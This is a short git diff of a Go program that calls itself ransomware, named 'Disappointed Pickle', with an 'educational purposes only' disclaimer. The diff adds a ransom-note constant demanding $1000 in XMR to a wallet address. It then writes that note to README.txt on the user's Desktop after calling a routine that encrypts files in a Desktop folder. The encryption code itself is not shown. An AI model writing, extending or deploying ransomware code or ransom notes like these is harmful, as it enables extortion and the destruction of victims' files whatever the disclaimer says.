@@ -28,6 +28,8 @@ const Version = "1.0"
 const Disclaimer = colors.ColorRed + "Disclaimer: " + colors.ColorBlue + "\nThis code is ransomware and is for educational purposes only. " +
 	"Do not use it for malicious purposes. the creator not responsible for any damage caused by this code." + colors.ColorReset
 
+const Statement = "Your files have been encrypted. To decrypt them, send $1000 worth in XMR to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"
+
 func titleScreen() {
 	title := figure.NewFigure("Disappointed  Pickle  "+Version, "puffy", true)
 	title.Print()
@@ -77,5 +79,5 @@ func main() {
 
 	ransomware.ExecuteRansom(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//songs"), key)
 
-	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//README.txt"), []byte("Your files have been encrypted. To decrypt them, send $1000 to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2\n"), 0644)
+	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//README.txt"), []byte(Statement), 0644)
 }
